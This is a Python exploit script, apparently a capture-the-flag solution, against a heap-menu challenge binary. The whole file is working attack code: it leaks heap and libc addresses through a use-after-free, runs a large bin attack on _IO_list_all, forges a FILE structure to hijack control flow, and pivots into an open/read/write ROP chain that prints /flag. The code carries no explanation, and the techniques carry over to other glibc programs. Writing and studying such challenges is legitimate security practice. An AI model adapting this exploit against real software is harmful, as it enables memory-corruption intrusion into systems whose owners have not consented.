from flashlib import *

init("./main_patched",ssl=True)

gdbscript ="""
"""

def menu(choice):
    io.sendlineafter(b"do you choose?", str(choice).encode())

def malloc(idx, size):
    menu(1)
    io.sendlineafter(b"Enter index:", str(idx).encode())
    io.sendlineafter(b"Enter size:", str(size).encode())
    return idx

def edit(idx, data):
    menu(2)
    io.sendlineafter(b"Enter index:", str(idx).encode())
    io.sendafter(b"Enter data:", data)

def free(idx):
    menu(3)
    io.sendlineafter(b"Enter index:", str(idx).encode())

def show(idx):
    menu(4)
    io.sendlineafter(b"Enter index:", str(idx).encode())
    io.recvline()

malloc(0, 0x80)
free(0)
show(0)
heap = (fixleak(io.recv(5)) << 12) - 0x3000
print("heap :",hex(heap))

malloc(1,0x700)
malloc(2,0x700)
free(1)
show(1)
libc.address = fixleak(io.recv(8)) - 0x203b20
print("libc :",hex(libc.address))
malloc(1,0x700)

#large bin attack

p1 = malloc(4, 0x428)
g1 = malloc(5, 0x328)  


p2 = malloc(6, 0x418)
g2 = malloc(7, 0x328) 

free(p1)
g3 = malloc(8, 0x438) 

free(p2)

large_bin_fd = p64(libc.address + 0x203f10)
large_bin_bk = p64(libc.address + 0x203f10)
fd_next_size = p64(heap + 0x43e0)
bk_next_size = p64(libc.symbols['_IO_list_all'] - 0x20)

edit(p1,large_bin_fd + large_bin_bk + fd_next_size + bk_next_size)


g4 = malloc(9, 0x438)

vtable = libc.sym._IO_wfile_jumps
io_file = heap + 0x4b40

stack_pivot_gadget = 0x5ef6f + libc.address
#mov rdx, rsp
mov_rdx_rax_call = 0x1303d5 + libc.address
#mov rdx, rax ; call qword ptr [rbx + 0x28] 
add_rsp = 0x8A520 + libc.address 
#add rsp, 2C8h
syscall = 0xF4749 + libc.address #syscall ; ret
pop_rdi = 0x10f75b + libc.address
pop_rdx = 0xb503c + libc.address
#pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret 
pop_rsi = 0x110a4d + libc.address
pop_rax = 0xdd237 +libc.address
payload = flat(
    0x400,
    0x00, 0x00, 0x00, 0x00, stack_pivot_gadget, 0x00, 0x00,
    0x00, mov_rdx_rax_call, 0x00, 0x00, 0x00, 0x00,
    0x0, 0x0, 0x00, libc.bss()+0x100, 0x00,
    io_file+0x20, io_file-0x20,
    0x0, 0x0, 0x0, (io_file-0xe0)+0xc0, 0x0, 0x0, 
    vtable)

fname = b"/flag"
fname_addr = 0x4b28 + heap
flag_addr = 0x410 + heap

rop  = p64(pop_rdi)+p64(fname_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(0)*4+p64(pop_rax)+p64(2)+p64(syscall)
rop += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(pop_rax)+p64(0)+p64(syscall)
rop += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(pop_rax)+p64(1)+p64(syscall)

aaa =  payload[16:] + ((0x2C0 - len(payload[16:])) * b"\x00") + rop

edit(p2,aaa)

edit(g1,b"\x00"*0x300+p64(add_rsp) + fname + b"\x00"*(0x18-len(fname)) +payload[:8])
attach(gdbscript)
menu(1)
io.sendlineafter(b"Enter index:", b"66")

io.interactive()